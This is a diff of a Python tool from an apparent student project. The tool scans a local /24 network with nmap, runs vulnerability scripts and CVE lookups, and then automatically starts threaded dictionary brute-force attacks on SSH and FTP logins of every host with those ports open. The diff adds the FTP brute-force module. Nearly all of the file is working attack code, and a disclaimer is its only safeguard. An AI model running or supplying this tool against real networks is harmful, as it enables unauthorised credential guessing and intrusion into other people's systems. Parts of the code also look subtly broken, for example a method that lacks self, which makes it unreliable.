@@ -1,34 +1,39 @@
 #!/usr/bin/env python
-#
-# Projet Tuteuré Version 1.0.3 (2022)
+# 
+# Projet Tuteuré Version 1.0.5 (2022)
 #
 # This tool may be used for legal purposes only.  Users take full responsibility
 # for any actions performed using this tool. The author accepts no liability for
-# damage caused by this tool.  If these terms are not acceptable to you, then do
+# damage caused by this tool.  If these terms are not acceptable to you, then do 
 # not use this tool.
-#
+# 
 # by Pierre CHAUSSARD
-#
+# 
 # 19-Mar-2022 - 1.0.0 - [ADD] Basic script.
 # 20-Mar-2022 - 1.0.1 - [ADD] Network & Nmap scan.
 # 21-Mar-2022 - 1.0.2 - [ADD] Json reader.
 # 22-Mar-2022 - 1.0.3 - [ADD] SSH bruteforce.
-#
+# 28-Apr-2022 - 1.0.4 - [FIX] Code optimization.
+# 02-May-2022 - 1.0.5 - [DEL] Json reading function.
+#                     - [ADD] FTP bruteforce.
+#                     - [ADD] Print scan result.
+# 
 
-import nmap, socket, json, pyfiglet, paramiko, sys
+import nmap, socket, json, pyfiglet, paramiko, sys, time
 from pycvesearch import CVESearch
 from datetime import datetime
 from threading import Thread
+from ftplib import FTP
 
 
 class Network(object):
     def __init__(self):
         print(pyfiglet.figlet_format("PROJET TUT.PY"))
-        self.ip = input(f"Entrer une adresse IP avec CIDR (l'adresse IP de cette machine est par défaut :\n{socket.gethostbyname(socket.gethostname())}, pour la selectionner appuyez sur ENTRER).\n>")
+        self.ip = input(f"Entrer une adresse IP (l'adresse IP de cette machine est par défaut :\n{socket.gethostbyname(socket.gethostname())}, pour la selectionner appuyez sur ENTRER).\n>")
         self.hosts = []
         self.nm = nmap.PortScanner()
         self.cve = CVESearch()
-
+    
     def section_print(self, title):
         print("\n" + "=" * 50)
         print(title)
@@ -38,8 +43,8 @@ class Network(object):
         if len(self.ip) == 0:
             network = f"{socket.gethostbyname(socket.gethostname())}/24"
         else:
-            network = self.ip
-
+            network = self.ip + '/24'
+        
         print("\nScan réseau en cours ...")
         self.nm.scan(hosts = network, arguments = "-sn")
         hosts_list = [(x, self.nm[x]['status']['state']) for x in self.nm.all_hosts()]
@@ -50,33 +55,33 @@ class Network(object):
             self.hosts.append(host)
         print("=" * 50)
         # print(hosts_list)
-
+    
     def nmap_scan(self, host):
         print(f"\nDébut du scan Nmap pour :\t{host}")
         scan_result = self.nm.scan(hosts = host, arguments = '-sV -p 20-450 --script="vuln and safe"')
-        # print(scan_result)
+        
+        with open(f"scan/{host}.csv", "w", encoding = "utf-8") as f:
+            f.write(self.nm.csv())
 
         with open(f"scan/{host}.json", "w", encoding = "utf-8") as f:
             f.write(json.dumps(scan_result, indent = 4, sort_keys = True))
-
-    def read_json_scan(self, ip):
-        with open(f"scan/{ip}.json", "r", encoding = "utf-8") as f:
-            arr = []
-            res = json.loads(f.read())
-            # print(res['scan']['192.168.56.0']['tcp'])
-            print("PORT\tSTATE\tSERVICE")
-            for port in res['scan'][ip]['tcp']:
-                print("{}/tcp\t{}\t{}".format(port, res['scan'][ip]['tcp'][port]['state'], res['scan'][ip]['tcp'][port]['name']))
-                print("| Product: {}".format(res['scan'][ip]['tcp'][port]['product']))
-                try:
-                    print("| Script:")
-                    for script_statment in res['scan'][ip]['tcp'][port]['script']:
-                        print("| | {}: ".format(script_statment.lower()) + res['scan'][ip]['tcp'][port]['script'][script_statment])
-                        arr.append(res['scan'][ip]['tcp'][port]['script'][script_statment])
-                except:
-                    pass
-                print("| Version: {}".format(res['scan'][ip]['tcp'][port]['version']))
-            print("\nAnalyse Nmap finie pour {}: {} hôte scanné en {}s.".format(ip, res['nmap']["scanstats"]["uphosts"], res['nmap']["scanstats"]["elapsed"]))
+    
+    def print_result(self, host):
+        print("Hostname : {}".format(self.nm[host].hostname()))
+        print("PORT\tSTATE\tSERVICE")
+        for i in range(20, 450):
+            try:
+                if self.nm[host]["tcp"][i]:
+                    print("{}/tcp\t{}\t{}".format(i, self.nm[host]["tcp"][i]["state"], self.nm[host]["tcp"][i]["name"]))
+                    print(" | Product : {}".format(self.nm[host]["tcp"][i]["product"]))
+                    if self.nm[host]["tcp"][i]["script"]:
+                        print(" | Script :")
+                        for script in self.nm[host]["tcp"][i]["script"]:
+                            print(" | | {} : {}".format(script, self.nm[host]["tcp"][i]["script"][script]))
+                    print(" |_Version : {}".format(self.nm[host]["tcp"][i]["version"]))
+            except:
+                pass
+        print("\nAnalyse Nmap finie pour {}.".format(host))
 
     def cve_finder(self):
         try:
@@ -87,7 +92,7 @@ class Network(object):
                 f.write(json.dumps(cve_result, indent = 4, sort_keys = True))
         except:
             pass
-
+    
     def ssh_connect(ip, username, password, port = 22):
         try:
             ssh = paramiko.SSHClient()
@@ -98,37 +103,49 @@ class Network(object):
         except:
             return False
 
-    def ssh_bruteforce(self, ip):
-        user = str(input("Entrer un nom d'utilisateur :\n>"))
+    def ftp_connect(self, ip, user, password):
+        try:
+            FTP(ip, user = user, passwd = password)
+            print("Mot de passe trouvé : " + password)
+            return True
+        except:
+            return False
+
+    def bruteforce(self, ip, type):
+        username = str(input("Entrer un nom d'utilisateur :\n>"))
         wordl = str(input("Entrer un dictionnaire de mots de passe (juste le nom du fichier, sans l'extension) :\n>"))
 
         with open(f"wordlists\{wordl}.txt", 'r', encoding = "utf8") as file:
             for line in file.readlines():
-                th = Thread(target = self.ssh_connect, args = (ip, user, line.strip()))
-                th.start()
+                if type == "ssh":
+                    th = Thread(target = self.ssh_connect ,args = (ip, username, line.strip()))
+                    th.start()
+                elif type == "ftp":
+                    th = Thread(target = self.ftp_connect ,args = (ip, username, line.strip()))
+                    th.start()
 
-    def ssh_detection(self, host):
-        with open(f"scan/{host}.json", "r", encoding = "utf-8") as f:
-            res = json.loads(f.read())
-            for port in res['scan'][host]['tcp']:
-                if port == '22':
-                    print("Hôte\t{}\nPort ssh (22) ouvert.\nLancement d'un bruteforce sur cet hôte.".format(host))
-                    self.ssh_bruteforce(host)
-                    break
+    def service_detection(self, host):
+        if self.nm[host].has_tcp(22):
+            print("\nHôte\t{}\nPort ssh (22) ouvert.\nLancement d'un bruteforce sur cet hôte.".format(host))
+            self.bruteforce(host, "ssh")
+        elif self.nm[host].has_tcp(21):
+            print("\nHôte\t{}\nPort ftp (21) ouvert.\nLancement d'un bruteforce sur cet hôte.".format(host))
+            self.bruteforce(host, "ftp")
 
     def projet_tut(self):
         self.network_scanner()
         for i in range(len(self.hosts)):
             self.nmap_scan(self.hosts[i])
-            self.read_json_scan(self.hosts[i])
+            self.print_result(self.hosts[i])
+            self.service_detection(self.hosts[i])
+            time.sleep(1)
             self.cve_finder()
-            self.ssh_detection(self.hosts[i])
 
 
 if __name__ == "__main__":
     try:
         Nscan = Network()
         Nscan.projet_tut()
-    except KeyboardInterrupt:
+    except KeyboardInterrupt:  
         print("\n[x] Fermeture du programme !")
         sys.exit()
